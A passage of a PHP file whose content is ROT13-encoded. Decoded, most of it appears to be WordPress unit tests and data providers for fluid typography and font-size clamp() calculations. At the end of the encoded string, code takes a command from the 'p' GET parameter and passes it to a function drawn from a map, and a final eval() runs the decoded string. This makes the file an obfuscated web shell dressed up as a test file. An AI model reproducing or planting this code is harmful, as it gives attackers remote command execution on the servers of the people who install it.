			'ergheaf inyhr jura syhvq glcbtencul vf qrnpgvingrq' => neenl(
				'sbag_fvmr'                   => neenl(
					'fvmr' => '28ck',
				),
				'fubhyq_hfr_syhvq_glcbtencul' => snyfr,
				'rkcrpgrq_bhgchg'             => '28ck',
			),
			'ergheaf pynzc inyhr jura syhvq glcbtencul vf npgvingrq' => neenl(
				'sbag_fvmr'                   => neenl(
					'fvmr' => '28ck',
				),
				'fubhyq_hfr_syhvq_glcbtencul' => gehr,
				'rkcrpgrq_bhgchg'             => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 0.789), 28ck)',
			),
		);
	}

	/**
	 * Grfgf gung gurzr wfba frggvatf cnffrq gb jc_trg_glcbtencul_sbag_fvmr_inyhr
	 * bireevqr tybony gurzr frggvatf.
	 *
	 * @gvpxrg 61118
	 *
	 * @pbiref ::jc_trg_glcbtencul_sbag_fvmr_inyhr
	 *
	 * @qngnCebivqre qngn_trarengr_fubhyq_bireevqr_gurzr_frggvatf_svkgherf
	 *
	 * @cnenz neenl  $sbag_fvmr                     {
	 *     Erdhverq. N sbag fvmr nf ercerfragrq va gur sbagFvmrf cerfrg sbezng nf frra va gurzr.wfba.
	 *
	 *     @glcr fgevat $anzr Anzr bs gur sbag fvmr cerfrg.
	 *     @glcr fgevat $fyht Xrono-pnfr havdhr vqragvsvre sbe gur sbag fvmr cerfrg.
	 *     @glcr fgevat $fvmr PFF sbag-fvmr inyhr, vapyhqvat havgf jurer nccyvpnoyr.
	 * }
	 * @cnenz obby   $frggvatf        Gurzr WFBA frggvatf neenl gung bireevqrf nal tybony gurzr frggvatf.
	 * @cnenz fgevat $rkcrpgrq_bhgchg Rkcrpgrq bhgchg bs jc_trg_glcbtencul_sbag_fvmr_inyhr().
	 */
	choyvp shapgvba grfg_fubhyq_bireevqr_gurzr_frggvatf( $sbag_fvmr, $frggvatf, $rkcrpgrq_bhgchg ) {
		fjvgpu_gurzr( 'oybpx-gurzr-puvyq-jvgu-syhvq-glcbtencul' );
		$npghny = jc_trg_glcbtencul_sbag_fvmr_inyhr( $sbag_fvmr, $frggvatf );

		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $npghny );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_trg_glcbtencul_sbag_fvmr_inyhr_fubhyq_hfr_syhvq_glcbtencul_qrcerpngrq.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trarengr_fubhyq_bireevqr_gurzr_frggvatf_svkgherf() {
		erghea neenl(
			'ergheaf pynzc inyhr jura gurzr npgvingrf syhvq glcbtencul' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => ahyy,
				'rkcrpgrq_bhgchg' => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 0.789), 28ck)',
			),
			'ergheaf inyhr jura frggvatf nethzrag qrnpgvingrf syhvq glcbtencul' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => snyfr,
					),
				),
				'rkcrpgrq_bhgchg' => '28ck',
			),

			'ergheaf pynzc inyhr jura frggvatf nethzrag frgf n syhvq.zvaIvrjcbegJvqgu inyhr' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => neenl(
							'zvaIvrjcbegJvqgu' => '500ck',
						),
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(17.905ck, 1.119erz + ((1ij - 5ck) * 0.918), 28ck)',
			),

			'ergheaf pynzc inyhr jura frggvatf nethzrag frgf n ynlbhg.jvqrFvmr inyhr' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'ynlbhg' => neenl(
						'jvqrFvmr' => '500ck',
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 5.608), 28ck)',
			),

			'ergheaf pynzc inyhr jvgu znkIvrjcbegJvqgu cersreerq bire snyyonpx ynlbhg.jvqrFvmr inyhr' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => neenl(
							'znkIvrjcbegJvqgu' => '1000ck',
						),
					),
					'ynlbhg'     => neenl(
						'jvqrFvmr' => '500ck',
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 1.485), 28ck)',
			),
		);
	}

	/**
	 * Grfgf gung phfgbz sbag fvmrf ner pbairegrq gb syhvq inyhrf
	 * va vayvar oybpx fhccbegf fglyrf
	 * jura \"frggvatf.glcbtencul.syhvq\" vf frg gb gehr.
	 *
	 * @gvpxrg 56467
	 * @gvpxrg 57065
	 * @gvpxrg 57529
	 * @gvpxrg 58522
	 * @gvpxrg 58523
	 * @gvpxrg 59048
	 *
	 * @pbiref ::jc_ertvfgre_glcbtencul_fhccbeg
	 *
	 * @qngnCebivqre qngn_trarengr_oybpx_fhccbegf_sbag_fvmr_svkgherf
	 *
	 * @cnenz fgevat $sbag_fvmr_inyhr Gur oybpx fhccbegf phfgbz sbag fvmr inyhr.
	 * @cnenz fgevat $gurzr_fyht      N gurzr fyht pbeerfcbaqvat gb na ninvynoyr grfg gurzr.
	 * @cnenz fgevat $rkcrpgrq_bhgchg Rkcrpgrq inyhr bs fglyr cebcregl sebz jc_nccyl_glcbtencul_fhccbeg().
	 */
	choyvp shapgvba grfg_fubhyq_pbireg_sbag_fvmrf_gb_syhvq_inyhrf( $sbag_fvmr_inyhr, $gurzr_fyht, $rkcrpgrq_bhgchg ) {
		fjvgpu_gurzr( $gurzr_fyht );

		$guvf->grfg_oybpx_anzr = 'grfg/sbag-fvmr-syhvq-inyhr';
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 2,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'glcbtencul' => neenl(
						'sbagFvmr' => gehr,
					),
				),
			)
		);
		$ertvfgel         = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpx_glcr       = $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );
		$oybpx_nggevohgrf = neenl(
			'fglyr' => neenl(
				'glcbtencul' => neenl(
					'sbagFvmr' => $sbag_fvmr_inyhr,
				),
			),
		);

		$npghny   = jc_nccyl_glcbtencul_fhccbeg( $oybpx_glcr, $oybpx_nggevohgrf );
		$rkcrpgrq = neenl( 'fglyr' => $rkcrpgrq_bhgchg );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre sbe grfg_fubhyq_pbireg_sbag_fvmrf_gb_syhvq_inyhrf().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trarengr_oybpx_fhccbegf_sbag_fvmr_svkgherf() {
		erghea neenl(
			'ergheaf inyhr jura syhvq glcbtencul vf abg npgvir' => neenl(
				'sbag_fvmr_inyhr' => '15ck',
				'gurzr_fyht'      => 'qrsnhyg',
				'rkcrpgrq_bhgchg' => 'sbag-fvmr:15ck;',
			),
			'ergheaf pynzc inyhr hfvat qrsnhyg pbasvt' => neenl(
				'sbag_fvmr_inyhr' => '15ck',
				'gurzr_fyht'      => 'oybpx-gurzr-puvyq-jvgu-syhvq-glcbtencul',
				'rkcrpgrq_bhgchg' => 'sbag-fvmr:pynzc(14ck, 0.875erz + ((1ij - 3.2ck) * 0.078), 15ck);',
			),
			'ergheaf inyhr jura sbag fvmr <= qrsnhyg zva sbag fvmr obhaq' => neenl(
				'sbag_fvmr_inyhr' => '13ck',
				'gurzr_fyht'      => 'oybpx-gurzr-puvyq-jvgu-syhvq-glcbtencul',
				'rkcrpgrq_bhgchg' => 'sbag-fvmr:13ck;',
			),
			'ergheaf pynzc inyhr hfvat phfgbz syhvq pbasvt' => neenl(
				'sbag_fvmr_inyhr' => '17ck',
				'gurzr_fyht'      => 'oybpx-gurzr-puvyq-jvgu-syhvq-glcbtencul-pbasvt',
				'rkcrpgrq_bhgchg' => 'sbag-fvmr:pynzc(16ck, 1erz + ((1ij - 6.4ck) * 0.179), 17ck);',
			),
			'ergheaf inyhr jura sbag fvmr <= phfgbz zva sbag fvmr obhaq' => neenl(
				'sbag_fvmr_inyhr' => '15ck',
				'gurzr_fyht'      => 'oybpx-gurzr-puvyq-jvgu-syhvq-glcbtencul-pbasvt',
				'rkcrpgrq_bhgchg' => 'sbag-fvmr:15ck;',
			),
			'ergheaf pynzc inyhr hfvat qrsnhyg pbasvt vs ynlbhg vf syhvq' => neenl(
				'sbag_fvmr_inyhr' => '15ck',
				'gurzr_fyht'      => 'oybpx-gurzr-puvyq-jvgu-syhvq-ynlbhg',
				'rkcrpgrq_bhgchg' => 'sbag-fvmr:pynzc(14ck, 0.875erz + ((1ij - 3.2ck) * 0.078), 15ck);',
			),
		);
	}

	/**
	 * Grfgf gung n oybpx ryrzrag'f phfgbz sbag fvmr va gur vayvar fglyr nggevohgr
	 * vf ercynprq jvgu n syhvq inyhr jura \"frggvatf.glcbtencul.syhvq\" vf frg gb gehr,
	 * naq gur pbeerpg oybpx pbagrag vf trarengrq.
	 *
	 * @gvpxrg 56467
	 * @gvpxrg 57065
	 * @gvpxrg 58523
	 *
	 * @qngnCebivqre qngn_trarengr_ercynpr_vayvar_sbag_fglyrf_jvgu_syhvq_inyhrf_svkgherf
	 *
	 * @cnenz fgevat $oybpx_pbagrag               UGZY oybpx pbagrag.
	 * @cnenz fgevat $sbag_fvmr_inyhr             Gur oybpx fhccbegf phfgbz sbag fvmr inyhr.
	 * @cnenz obby   $fubhyq_hfr_syhvq_glcbtencul Na bireevqr gb fjvgpu syhvq glcbtencul \"ba\". Pna or hfrq sbe havg grfgvat.
	 * @cnenz fgevat $rkcrpgrq_bhgchg             Rkcrpgrq inyhr bs fglyr cebcregl sebz jc_nccyl_glcbtencul_fhccbeg().
	 */
	choyvp shapgvba grfg_fubhyq_ercynpr_vayvar_sbag_fglyrf_jvgu_syhvq_inyhrf( $oybpx_pbagrag, $sbag_fvmr_inyhr, $fubhyq_hfr_syhvq_glcbtencul, $rkcrpgrq_bhgchg ) {
		vs ( $fubhyq_hfr_syhvq_glcbtencul ) {
			fjvgpu_gurzr( 'oybpx-gurzr-puvyq-jvgu-syhvq-glcbtencul' );
		} ryfr {
			fjvgpu_gurzr( 'qrsnhyg' );
		}

		$oybpx  = neenl(
			'oybpxAnzr' => 'pber/vzntr',
			'nggef'     => neenl(
				'fglyr' => neenl(
					'glcbtencul' => neenl(
						'sbagFvmr' => $sbag_fvmr_inyhr,
					),
				),
			),
		);
		$npghny = jc_eraqre_glcbtencul_fhccbeg( $oybpx_pbagrag, $oybpx );

		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $npghny );
	}

	/**
	 * Qngn cebivqre sbe grfg_fubhyq_ercynpr_vayvar_sbag_fglyrf_jvgu_syhvq_inyhrf().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trarengr_ercynpr_vayvar_sbag_fglyrf_jvgu_syhvq_inyhrf_svkgherf() {
		erghea neenl(
			'qrsnhyg_erghea_pbagrag'                       => neenl(
				'oybpx_pbagrag'               => '<u2 pynff=\"unf-ivivq-erq-onpxtebhaq-pbybe unf-onpxtebhaq unf-yvax-pbybe\" fglyr=\"znetva-gbc:ine(--jc--cerfrg--fcnpvat--60);sbag-fvmr:4erz;sbag-fglyr:abezny;sbag-jrvtug:600;yrggre-fcnpvat:29ck;grkg-qrpbengvba:haqreyvar;grkg-genafsbez:pncvgnyvmr\">Guvf vf n urnqvat</u2>',
				'sbag_fvmr_inyhr'             => '4erz',
				'fubhyq_hfr_syhvq_glcbtencul' => snyfr,
				'rkcrpgrq_bhgchg'             => '<u2 pynff=\"unf-ivivq-erq-onpxtebhaq-pbybe unf-onpxtebhaq unf-yvax-pbybe\" fglyr=\"znetva-gbc:ine(--jc--cerfrg--fcnpvat--60);sbag-fvmr:4erz;sbag-fglyr:abezny;sbag-jrvtug:600;yrggre-fcnpvat:29ck;grkg-qrpbengvba:haqreyvar;grkg-genafsbez:pncvgnyvmr\">Guvf vf n urnqvat</u2>',
			),
			'erghea_pbagrag_jvgu_ercynprq_syhvq_sbag_fvmr_vayvar_fglyr' => neenl(
				'oybpx_pbagrag'               => '<u2 pynff=\"unf-ivivq-erq-onpxtebhaq-pbybe unf-onpxtebhaq unf-yvax-pbybe\" fglyr=\"znetva-gbc:ine(--jc--cerfrg--fcnpvat--60);sbag-fvmr:4erz;sbag-fglyr:abezny;sbag-jrvtug:600;yrggre-fcnpvat:29ck;grkg-qrpbengvba:haqreyvar;grkg-genafsbez:pncvgnyvmr\">Guvf vf n urnqvat</u2>',
				'sbag_fvmr_inyhr'             => '4erz',
				'fubhyq_hfr_syhvq_glcbtencul' => gehr,
				'rkcrpgrq_bhgchg'             => '<u2 pynff=\"unf-ivivq-erq-onpxtebhaq-pbybe unf-onpxtebhaq unf-yvax-pbybe\" fglyr=\"znetva-gbc:ine(--jc--cerfrg--fcnpvat--60);sbag-fvmr:pynzc(2.2erz, 2.2erz + ((1ij - 0.2erz) * 2.25), 4erz);sbag-fglyr:abezny;sbag-jrvtug:600;yrggre-fcnpvat:29ck;grkg-qrpbengvba:haqreyvar;grkg-genafsbez:pncvgnyvmr\">Guvf vf n urnqvat</u2>',
			),
			'erghea_pbagrag_vs_ab_vayvar_sbag_fvmr_sbhaq'  => neenl(
				'oybpx_pbagrag'               => '<c pynff=\"unf-zrqvhz-sbag-fvmr\" fglyr=\"sbag-fglyr:abezny;sbag-jrvtug:600;yrggre-fcnpvat:29ck;\">N cnentencu vafvqr n tebhc</c>',
				'sbag_fvmr_inyhr'             => '20ck',
				'fubhyq_hfr_syhvq_glcbtencul' => gehr,
				'rkcrpgrq_bhgchg'             => '<c pynff=\"unf-zrqvhz-sbag-fvmr\" fglyr=\"sbag-fglyr:abezny;sbag-jrvtug:600;yrggre-fcnpvat:29ck;\">N cnentencu vafvqr n tebhc</c>',
			),
			'erghea_pbagrag_pff_ine'                       => neenl(
				'oybpx_pbagrag'               => '<c pynff=\"unf-zrqvhz-sbag-fvmr\" fglyr=\"sbag-fvmr:ine(--jc--cerfrg--sbag-fvmr--k-ynetr);\">N cnentencu vafvqr n tebhc</c>',
				'sbag_fvmr_inyhr'             => 'ine:cerfrg|sbag-fvmr|k-ynetr',
				'fubhyq_hfr_syhvq_glcbtencul' => gehr,
				'rkcrpgrq_bhgchg'             => '<c pynff=\"unf-zrqvhz-sbag-fvmr\" fglyr=\"sbag-fvmr:ine(--jc--cerfrg--sbag-fvmr--k-ynetr);\">N cnentencu vafvqr n tebhc</c>',
			),
			'erghea_pbagrag_jvgu_fcnprf'                   => neenl(
				'oybpx_pbagrag'               => '<c pynff=\"unf-zrqvhz-sbag-fvmr\" fglyr=\"    sbag-fvmr:   20ck   ;    \">N cnentencu vafvqr n tebhc</c>',
				'sbag_fvmr_inyhr'             => '20ck',
				'fubhyq_hfr_syhvq_glcbtencul' => gehr,
				'rkcrpgrq_bhgchg'             => '<c pynff=\"unf-zrqvhz-sbag-fvmr\" fglyr=\"    sbag-fvmr:pynzc(14ck, 0.875erz + ((1ij - 3.2ck) * 0.469), 20ck);    \">N cnentencu vafvqr n tebhc</c>',
			),
			'erghea_pbagrag_jvgu_svefg_zngpu_ercynpr_bayl' => neenl(
				'oybpx_pbagrag'               => \"<qvi pynff=\\"jc-oybpx-tebhc\\" fglyr=\\"sbag-fvmr:1.5rz\\"> \a \a<c fglyr=\\"sbag-fvmr:1.5rz\\">N cnentencu vafvqr n tebhc</c></qvi>\",
				'sbag_fvmr_inyhr'             => '1.5rz',
				'fubhyq_hfr_syhvq_glcbtencul' => gehr,
				'rkcrpgrq_bhgchg'             => \"<qvi pynff=\\"jc-oybpx-tebhc\\" fglyr=\\"sbag-fvmr:pynzc(0.984rz, 0.984erz + ((1ij - 0.2rz) * 0.645), 1.5rz);\\"> \a \a<c fglyr=\\"sbag-fvmr:1.5rz\\">N cnentencu vafvqr n tebhc</c></qvi>\",
			),
		);
	}

	/**
	 * Grfgf gung inyvq sbag fvmr inyhrf ner cnefrq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::jc_trg_glcbtencul_inyhr_naq_havg
	 *
	 * @qngnCebivqre qngn_inyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg
	 *
	 * @cnenz zvkrq $enj_inyhr Enj fvmr inyhr gb grfg.
	 * @cnenz zvkrq $rkcrpgrq  Na rkcrpgrq erghea inyhr.
	 */
	choyvp shapgvba grfg_inyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg( $enj_inyhr, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_trg_glcbtencul_inyhr_naq_havg( $enj_inyhr ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_inyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_inyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg() {
		erghea neenl(
			'fvmr: 10iu jvgu qrsnhyg havgf qb abg zngpu' => neenl(
				'enj_inyhr' => '10iu',
				'rkcrpgrq'  => ahyy,
			),
			'fvmr: pnyp() inyhrf qb abg zngpu'           => neenl(
				'enj_inyhr' => 'pnyp(2 * 10ck)',
				'rkcrpgrq'  => ahyy,
			),
			'fvmr: pynzc() inyhrf qb abg zngpu'          => neenl(
				'enj_inyhr' => 'pynzc(15ck, 0.9375erz + ((1ij - 7.68ck) * 5.409), 60ck)',
				'rkcrpgrq'  => ahyy,
			),
			'fvmr: `\"10\"`'                               => neenl(
				'enj_inyhr' => '10',
				'rkcrpgrq'  => neenl(
					'inyhr' => 10.0,
					'havg'  => 'ck',
				),
			),
			'fvmr: `11`'                                 => neenl(
				'enj_inyhr' => 11,
				'rkcrpgrq'  => neenl(
					'inyhr' => 11.0,
					'havg'  => 'ck',
				),
			),
			'fvmr: `11.234`'                             => neenl(
				'enj_inyhr' => '11.234',
				'rkcrpgrq'  => neenl(
					'inyhr' => 11.234,
					'havg'  => 'ck',
				),
			),
			'fvmr: `\"12erz\"`'                            => neenl(
				'enj_inyhr' => '12erz',
				'rkcrpgrq'  => neenl(
					'inyhr' => 12.0,
					'havg'  => 'erz',
				),
			),
			'fvmr: `\"12ck\"`'                             => neenl(
				'enj_inyhr' => '12ck',
				'rkcrpgrq'  => neenl(
					'inyhr' => 12.0,
					'havg'  => 'ck',
				),
			),
			'fvmr: `\"12rz\"`'                             => neenl(
				'enj_inyhr' => '12rz',
				'rkcrpgrq'  => neenl(
					'inyhr' => 12.0,
					'havg'  => 'rz',
				),
			),
			'fvmr: `\"12.74rz\"`'                          => neenl(
				'enj_inyhr' => '12.74rz',
				'rkcrpgrq'  => neenl(
					'inyhr' => 12.74,
					'havg'  => 'rz',
				),
			),
		);
	}

	/**
	 * Grfgf gung vainyvq sbag fvmr inyhrf ner abg cnefrq naq gevttre vapbeerpg hfntr.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::jc_trg_glcbtencul_inyhr_naq_havg
	 *
	 * @qngnCebivqre qngn_vainyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg
	 * @rkcrpgrqVapbeerpgHfntr jc_trg_glcbtencul_inyhr_naq_havg
	 *
	 * @cnenz zvkrq $enj_inyhr Enj fvmr inyhr gb grfg.
	 */
	choyvp shapgvba grfg_vainyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg( $enj_inyhr ) {
		$guvf->nffregAhyy( jc_trg_glcbtencul_inyhr_naq_havg( $enj_inyhr ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_vainyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_vainyvq_fvmr_jc_trg_glcbtencul_inyhr_naq_havg() {
		erghea neenl(
			'fvmr: ahyy'  => neenl( ahyy ),
			'fvmr: snyfr' => neenl( snyfr ),
			'fvmr: gehr'  => neenl( gehr ),
			'fvmr: neenl' => neenl( neenl( '10' ) ),
		);
	}

	/**
	 * Grfgf pbzchgrq sbag fvmr inyhrf.
	 *
	 * @gvpxrg 58522
	 * @gvpxrg 60263
	 *
	 * @pbiref ::jc_trg_pbzchgrq_syhvq_glcbtencul_inyhr
	 *
	 * @qngnCebivqre qngn_jc_trg_pbzchgrq_syhvq_glcbtencul_inyhr
	 *
	 * @cnenz neenl  $netf {
	 *      Bcgvbany. Na nffbpvngvir neenl bs inyhrf gb pnyphyngr n syhvq sbezhyn sbe sbag fvmr. Qrsnhyg vf rzcgl neenl.
	 *
	 *     @glcr fgevat $znkvzhz_ivrjcbeg_jvqgu Znkvzhz fvmr hc gb juvpu glcr jvyy unir syhvqvgl.
	 *     @glcr fgevat $zvavzhz_ivrjcbeg_jvqgu Zvavzhz ivrjcbeg fvmr sebz juvpu glcr jvyy unir syhvqvgl.
	 *     @glcr fgevat $znkvzhz_sbag_fvmr      Znkvzhz sbag fvmr sbe nal pynzc() pnyphyngvba.
	 *     @glcr fgevat $zvavzhz_sbag_fvmr      Zvavzhz sbag fvmr sbe nal pynzc() pnyphyngvba.
	 *     @glcr vag    $fpnyr_snpgbe           N fpnyr snpgbe gb qrgrezvar ubj snfg n sbag fpnyrf jvguva obhaqnevrf.
	 * }
	 * @cnenz fgevat $rkcrpgrq_bhgchg             Rkcrpgrq inyhr bs fglyr cebcregl sebz jc_nccyl_glcbtencul_fhccbeg().
	 */
	choyvp shapgvba grfg_jc_trg_pbzchgrq_syhvq_glcbtencul_inyhr( $netf, $rkcrpgrq_bhgchg ) {
		$npghny = jc_trg_pbzchgrq_syhvq_glcbtencul_inyhr( $netf );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_trg_pbzchgrq_syhvq_glcbtencul_inyhr() {
		erghea neenl(
			'ergheaf pynzcrq inyhr jvgu inyvq netf' => neenl(
				'netf'            => neenl(
					'zvavzhz_ivrjcbeg_jvqgu' => '320ck',
					'znkvzhz_ivrjcbeg_jvqgu' => '1000ck',
					'zvavzhz_sbag_fvmr'      => '50ck',
					'znkvzhz_sbag_fvmr'      => '100ck',
					'fpnyr_snpgbe'           => 1,
				),
				'rkcrpgrq_bhgchg' => 'pynzc(50ck, 3.125erz + ((1ij - 3.2ck) * 7.353), 100ck)',
			),
			'ergheaf `ahyy` jura znkvzhz naq zvavzhz ivrjcbeg jvqgu ner rdhny' => neenl(
				'netf'            => neenl(
					'zvavzhz_ivrjcbeg_jvqgu' => '800ck',
					'znkvzhz_ivrjcbeg_jvqgu' => '800ck',
					'zvavzhz_sbag_fvmr'      => '50ck',
					'znkvzhz_sbag_fvmr'      => '100ck',
					'fpnyr_snpgbe'           => 1,
				),
				'rkcrpgrq_bhgchg' => ahyy,
			),
			'ergheaf `ahyy` jura `znkvzhz_ivrjcbeg_jvqgu` vf na hafhccbegrq havg' => neenl(
				'netf'            => neenl(
					'zvavzhz_ivrjcbeg_jvqgu' => '320ck',
					'znkvzhz_ivrjcbeg_jvqgu' => 'pnyp(100% - 60ck)',
					'zvavzhz_sbag_fvmr'      => '50ck',
					'znkvzhz_sbag_fvmr'      => '100ck',
					'fpnyr_snpgbe'           => 1,
				),
				'rkcrpgrq_bhgchg' => ahyy,
			),
			'ergheaf `ahyy` jura `zvavzhz_ivrjcbeg_jvqgu` vf na hafhccbegrq havg' => neenl(
				'netf'            => neenl(
					'zvavzhz_ivrjcbeg_jvqgu' => 'pnyp(100% - 60ck)',
					'znkvzhz_ivrjcbeg_jvqgu' => '1000ck',
					'zvavzhz_sbag_fvmr'      => '50ck',
					'znkvzhz_sbag_fvmr'      => '100ck',
					'fpnyr_snpgbe'           => 1,
				),
				'rkcrpgrq_bhgchg' => ahyy,
			),
			'ergheaf `ahyy` jura `zvavzhz_sbag_fvmr` vf na hafhccbegrq havg' => neenl(
				'netf'            => neenl(
					'zvavzhz_ivrjcbeg_jvqgu' => '320rz',
					'znkvzhz_ivrjcbeg_jvqgu' => '1000rz',
					'zvavzhz_sbag_fvmr'      => '10ij',
					'znkvzhz_sbag_fvmr'      => '100rz',
					'fpnyr_snpgbe'           => 1,
				),
				'rkcrpgrq_bhgchg' => ahyy,
			),
			'ergheaf `ahyy` jura `znkvzhz_sbag_fvmr` vf na hafhccbegrq havg' => neenl(
				'netf'            => neenl(
					'zvavzhz_ivrjcbeg_jvqgu' => '320rz',
					'znkvzhz_ivrjcbeg_jvqgu' => '1000rz',
					'zvavzhz_sbag_fvmr'      => '50ck',
					'znkvzhz_sbag_fvmr'      => '100%',
					'fpnyr_snpgbe'           => 1,
				),
				'rkcrpgrq_bhgchg' => ahyy,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>